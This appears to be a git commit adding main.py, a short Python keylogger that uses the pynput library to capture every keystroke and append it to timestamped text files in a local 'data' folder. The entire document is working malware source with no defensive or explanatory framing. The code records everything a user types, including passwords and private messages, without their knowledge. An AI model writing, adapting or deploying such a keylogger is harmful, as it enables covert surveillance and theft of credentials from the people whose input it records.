7d0911b88d6e8347a551dd362bcc2abad84cc5ef
rakin406 <rakinhacker@gmail.com>
2021-04-30 08:37:28 +0600

    add source file

---
+++ main.py
@@ -0,0 +1,28 @@
+#!/usr/bin/env python3
+import os
+from datetime import datetime
+import pynput
+from pynput.keyboard import Key, Listener
+
+# Directory to store logs
+if not os.path.exists("data"):
+    os.makedirs("data")
+
+LOG_FILE = "data/" + str(datetime.today().strftime('%Y-%m-%d-%H:%M:%S')) + ".txt"
+
+def on_press(key):
+    with open(LOG_FILE, "a") as log:
+        key = str(key).replace("'", "")
+        if key == "Key.space":
+            key = " "
+        elif key == "Key.enter":
+            key = "\n"
+        elif key == "Key.shift":
+            key = ""
+        elif key == "Key.backspace":
+            key = " [Backspace] "
+        log.write(key)
+
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
